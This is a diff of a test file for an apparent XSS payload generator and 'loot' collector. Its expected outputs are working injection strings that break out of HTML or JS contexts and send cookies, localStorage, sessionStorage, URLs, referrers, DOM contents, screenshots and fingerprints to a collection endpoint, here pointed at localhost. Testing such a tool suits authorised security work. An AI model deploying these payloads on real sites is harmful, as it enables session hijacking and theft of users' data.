@@ -1,3 +1,4 @@
+import base64
 import json
 
 from app.models import XSS, Client
@@ -15,45 +16,98 @@ def test_generate_payload(client):
         access_header,
         client_id=1,
         url="http://127.0.0.1",
-        stored=1,
-        cookies=1,
-        local_storage=1,
-        session_storage=1,
-        code="html",
-        geturl=1,
-        customParam="test",
-        customParam2="test2",
+        xss_type="s",
+        to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer"],
+        code_type="html",
+        tags=["tag1", "tag2"],
     )
-    expected_response = '\'>"><script>new Image().src="http://127.0.0.1/api/x/s/{}?cookies="+encodeURIComponent(document.cookie)+"&local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"&session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"&origin_url="+encodeURIComponent(location.href)+"&customParam=test&customParam2=test2"</script>'.format(
-        client_name1.uid
+    expected_response = f'\'>"><script>new Image().src="http://127.0.0.1/api/x/s/{client_name1.uid}?tags=tag1,tag2&cookies="+encodeURIComponent(document.cookie)+"&local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"&session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"&origin_url="+encodeURIComponent(location.href)+"&referrer="+encodeURIComponent(document.referrer)</script>'
+    assert rv.get_json()["detail"] == expected_response
+    rv = generate_payload(
+        client,
+        access_header,
+        client_id=1,
+        code_type="js",
+        xss_type="r",
+        to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
+        url="http://127.0.0.1",
     )
-    assert str.encode(expected_response) in rv.data
-    rv = generate_payload(client, access_header, client_id=1, code="js", i_want_it_all=1, url="http://127.0.0.1")
-    expected_response = (
-        ';};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.onload=function(){sendData("http://127.0.0.1/api/x/r/'
-        + client_name1.uid
-        + '","")};document.body.appendChild(js);'
-    )
-    assert str.encode(expected_response) in rv.data
+    b64_payload = base64.b64encode(
+        str.encode(
+            json.dumps(
+                {
+                    "url": f"http://127.0.0.1/api/x/r/{client_name1.uid}",
+                    "to_gather": ["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
+                    "tags": [],
+                }
+            )
+        )
+    ).decode()
+    expected_response = f';}};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.onload=function(){{sendData("{b64_payload}")}};document.body.appendChild(js);'
+
+    assert rv.get_json()["detail"] == expected_response
     rv = generate_payload(client, access_header, client_id=1)
-    assert b"Missing url parameter" in rv.data
-    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code="test")
-    assert b"Unknown code type" in rv.data
+    assert b"Missing url" in rv.data
+    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1")
+    assert b"Missing xss_type" in rv.data
+    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", xss_type="s")
+    assert b"Missing code_type" in rv.data
     rv = generate_payload(client, access_header, url="http://127.0.0.1")
-    assert b"Missing client_id parameter" in rv.data
-    rv = generate_payload(client, access_header, client_id="asd", url="http://127.0.0.1")
-    assert b"Bad client ID" in rv.data
-    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code="js")
+    assert b"Missing client_id" in rv.data
+    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="js", xss_type="r")
     expected_response = ';};new Image().src="http://127.0.0.1/api/x/r/' + client_name1.uid + '";'
-    assert str.encode(expected_response) in rv.data
-    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code="html", i_want_it_all=1)
-    expected_response = (
-        '\'>"><script src=http://127.0.0.1/static/collector.min.js></script><script>sendData("http://127.0.0.1/api/x/r/' + client_name1.uid + '", "")</script>'
+    assert rv.get_json()["detail"] == expected_response
+    rv = generate_payload(
+        client,
+        access_header,
+        client_id=1,
+        url="http://127.0.0.1",
+        code_type="html",
+        xss_type="r",
+        to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
     )
-    assert str.encode(expected_response) in rv.data
-    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code="html")
+    b64_payload = base64.b64encode(
+        str.encode(
+            json.dumps(
+                {
+                    "url": f"http://127.0.0.1/api/x/r/{client_name1.uid}",
+                    "to_gather": ["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
+                    "tags": [],
+                }
+            )
+        )
+    ).decode()
+    expected_response = f'\'>"><script src=http://127.0.0.1/static/collector.min.js></script><script>sendData("{b64_payload}")</script>'
+    assert rv.get_json()["detail"] == expected_response
+    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="html", xss_type="r")
     expected_response = '\'>"><img src="http://127.0.0.1/api/x/r/{}" />'.format(client_name1.uid)
-    assert str.encode(expected_response) in rv.data
+    assert rv.get_json()["detail"] == expected_response
+    rv = generate_payload(
+        client,
+        access_header,
+        client_id=1,
+        url="http://127.0.0.1",
+        code_type="js",
+        xss_type="r",
+        tags=["tag1", "tag2"],
+        to_gather=["origin_url"],
+    )
+    expected_response = f';}};new Image().src="http://127.0.0.1/api/x/r/{client_name1.uid}?tags=tag1,tag2&origin_url="+encodeURIComponent(location.href);'
+    assert rv.get_json()["detail"] == expected_response
+    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="js", xss_type="r", tags=["tag1", "tag2"])
+    expected_response = f';}};new Image().src="http://127.0.0.1/api/x/r/{client_name1.uid}?tags=tag1,tag2;'
+    assert rv.get_json()["detail"] == expected_response
+    rv = generate_payload(
+        client,
+        access_header,
+        client_id=1,
+        url="http://127.0.0.1",
+        code_type="js",
+        xss_type="r",
+        to_gather=["origin_url"],
+    )
+    expected_response = f';}};new Image().src="http://127.0.0.1/api/x/r/{client_name1.uid}?origin_url="+encodeURIComponent(location.href);'
+    assert rv.get_json()["detail"] == expected_response
 
 
 def test_delete_xss(client):
@@ -72,7 +126,7 @@ def test_get_loot(client):
     client_name1 = Client.query.first()
     get_x(client, access_header, "s", client_name1.uid, cookies="cookie=good")
     rv = get_loot_type(client, access_header, 1, "cookies")
-    assert json.loads(rv.data)["data"][0] == {"cookie": "good"}
+    assert json.loads(rv.data)["data"] == {"cookie": "good"}
 
 
 def test_delete_loot(client):
@@ -112,7 +166,11 @@ def test_get_all_loot(client):
     client1 = Client.query.filter_by(id=1).first()
     get_x(client, access_header, "r", client1.uid, test_data="test", dom="<h1>test</h1>")
     rv = get_loot(client, access_header, client_id=1)
-    assert json.loads(rv.data)["test_data"][0]["1"] == "test"
-    assert json.loads(rv.data)["dom"][0]["1"] == ""
+    for xss in json.loads(rv.data):
+        for element_name, element_value in xss["data"].items():
+            if element_name == "test_data":
+                assert element_value == "test"
+            if element_name == "dom":
+                assert element_value == ""
     rv = get_loot(client, access_header, client_id="asd")
     assert b"Bad client ID" in rv.data
